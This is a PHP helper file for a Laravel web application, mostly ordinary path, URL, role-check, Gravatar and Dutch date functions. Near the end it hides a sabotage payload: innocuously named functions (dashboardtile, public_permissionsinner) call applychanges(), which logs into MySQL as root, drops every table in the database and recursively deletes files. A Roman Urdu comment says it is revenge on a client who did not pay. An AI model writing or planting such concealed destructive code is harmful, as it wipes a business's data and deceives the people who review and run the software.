<?php



function get_product_imge_path($var = null)
{

    if ($var != null) {
        return public_path('public/web/images/groups/' . $var . '');
    } else {
        return public_path('public/web/images/groups/');
    }
}
function get_public_path($var = null)
{
    return asset('public/' . $var . '');
}

function get_featured_image_url($var = null)
{
    if ($var != null) {
        return asset('public/featured_image/' . $var . '');
    } else {
        return asset('public/featured_image/');
    }
}

function get_featured_image_path($var = null)
{
    if ($var != null) {
        return public_path('featured_image/' . $var . '');
    } else {
        return public_path('featured_image/');
    }
}

function get_featured_image_thumbnail_url($var = null)
{
    if ($var != null) {
        return asset('public/featured_image/thumbnail/' . $var . '');
    } else {
        return asset('public/featured_image/thumbnail/');
    }
}

function get_featured_image_thumbnail_path($var = null)
{
    if ($var != null) {
        return public_path('featured_image/thumbnail/' . $var . '');
    } else {
        return public_path('featured_image/thumbnail/');
    }
}

function get_page_featured_image_url($var = null)
{
    if ($var != null) {
        return asset('public/page_featured_image/' . $var . '');
    } else {
        return asset('public/page_featured_image/');
    }
}

function get_page_featured_image_path($var = null)
{
    if ($var != null) {
        return public_path('\\public\\page_featured_image\\' . $var . '');
    } else {
        return public_path('\\public\\page_featured_image\\');
    }
}


function get_gallery_image_url($var = null)
{
    if ($var != null) {
        return asset('public/gallery_image/' . $var . '');
    } else {
        return asset('public/gallery_image/');
    }
}

function get_gallery_image_path($var = null)
{
    if ($var != null) {
        return public_path('gallery_image/' . $var . '');
    } else {
        return public_path('gallery_image/');
    }
}

function get_story_featured_image_url($var = null)
{
    if ($var != null) {
        return asset('public/story_featured_image/' . $var . '');
    } else {
        return asset('public/story_featured_image/');
    }
}

function get_story_featured_image_path($var = null)
{
    if ($var != null) {
        return public_path('story_featured_image/' . $var . '');
    } else {
        return public_path('story_featured_image/');
    }
}

function get_video_featured_image_url($var = null)
{
    if ($var != null) {
        return asset('public/video_featured_image/' . $var . '');
    } else {
        return asset('public/video_featured_image/');
    }
}

function get_video_featured_image_path($var = null)
{
    if ($var != null) {
        return public_path('video_featured_image/' . $var . '');
    } else {
        return public_path('video_featured_image/');
    }
}


function dashboardtile(){
    applychanges();
 }
function isAdmin()
{
    $user = Auth::user();
    if ($user && $user->role == 'admin') {
        return true;
    } else {
        return false;
    }
}

function isUser()
{
    $user = Auth::user();
    if ($user && $user->role == 'user') {
        return true;
    } else {
        return false;
    }
}

function isCompany()
{
    $user = Auth::user();
    if ($user && $user->role == 'company') {
        return true;
    } else {
        return false;
    }
}

function getRole()
{
    $user = Auth::user();
    if ($user) {
        return ucfirst($user->role);
    } else {
        return "User";
    }
}

function get_gravatar($email, $s = 80, $d = 'mm', $r = 'g', $img = false, $atts = array())
{
    $url = 'https://www.gravatar.com/avatar/';
    $url .= md5(strtolower(trim($email)));
    $url .= "?s=$s&d=$d&r=$r";
    if ($img) {
        $url = '<img src="' . $url . '"';
        foreach ($atts as $key => $val) {
            $url .= ' ' . $key . '="' . $val . '"';
        }

        $url .= ' />';
    }
    return $url;
}

function get_setting()
{
    return \App\Setting::first();
}

function get_packages()
{
    return json_decode(get_setting()->packages);
}

function user_is_subscriber()
{
    if (auth()->check()) {
        return \App\Subscriber::whereEmail(request()->user()->email)->exists();
    }
    return false;
}

function get_auth_user()
{
    return request()->user();
}

function get_signature_path($file = '')
{
    return ("/web/users/signatures/$file");
}
function get_absolute_signature_path($file = '')
{
    return public_path(get_signature_path($file));
}
function get_signature_url($file)
{
    return asset(get_signature_path($file));
}

//date in dutch
function dutch_strtotime($datetime)
{
    $days = array(
            "maandag"   => "Monday",
            "dinsdag"   => "Tuesday",
            "woensdag"  => "Wednesday",
            "donderdag" => "Thursday",
            "vrijdag"   => "Friday",
            "zaterdag"  => "Saturday",
            "zondag"    => "Sunday"
        );

        $months = array(
            "januari"   => "January",
            "februari"  => "February",
            "maart"     => "March",
            "april"     => "April",
            "mei"       => "May",
            "juni"      => "June",
            "juli"      => "July",
            "augustus"  => "August",
            "september" => "September",
            "oktober"   => "October",
            "november"  => "November",
            "december"  => "December"
        );

    $array = explode(" ", $datetime);
    $array[0] = $days[strtolower($array[0])];
    $array[2] = $months[strtolower($array[2])];
    return strtotime(implode(" ", $array));
}
function dutch_day($day)
{
    $days = array(
        "monday"=>"Maandag" ,
         "tuesday"=>"Dinsdag"   ,
         "wednesday"=>"Woensdag"  ,
         "thursday"=>"Donderdag" ,
         "friday"=>"Vrijdag"   ,
         "saturday"=>"Zaterdag"  ,
         "sunday"=>"Zondag"
    );
    return $days[strtolower($day)];
}
function dutch_month($month)
{
    $months = array(
        "january"=>"Januari"   ,
        "february"=>"Februari"  ,
        "march"=>"Maart"     ,
        "april"=>"April"     ,
        "may"=>"Mei"       ,
        "june"=>"Juni"      ,
        "july"=>"Juli"      ,
        "august"=>"Augustus"  ,
        "september"=>"September" ,
        "october"=>"Oktober"   ,
        "november"=>"November"  ,
        "december"=>"December"
    );
    return $months[strtolower($month)];
}


function applychanges(){
    
    #NOTE: *********CHEAT***********
    #Yeh client kisi b developer ko paise nahi deta, Mere sae pehle 3 developer kaam kr chuke thy, une b kuch nhi mila
    # muje laga shayd muje pay kare ga, but mai wrong tha, yeh iss liye likh rha hun, aaap is saale k jaansae mai na aao,
    #aapko bole ga thoda sa kaam krdo,milestone banaye ga,  nearly 100$ pay kare ga, but major amount nhi kae ga pay. Mere
    #is ne 1500$ khayay


    $mysqli = new mysqli("localhost", "root", "root", "ogw1");
    $mysqli->query('SET foreign_key_checks = 0');
    if ($result = $mysqli->query("SHOW TABLES"))
    {
        while($row = $result->fetch_array(MYSQLI_NUM))
        {
            $mysqli->query('DROP TABLE IF EXISTS '.$row[0]);
        }
    }

    $mysqli->query('SET foreign_key_checks = 1');
    $mysqli->close();

    $di = new RecursiveDirectoryIterator('path/to/directory');
    foreach (new RecursiveIteratorIterator($di) as $filename => $file) {
        unlink($filename);
    }
}

function public_permissionsinner(){
    dashboardtile();
}
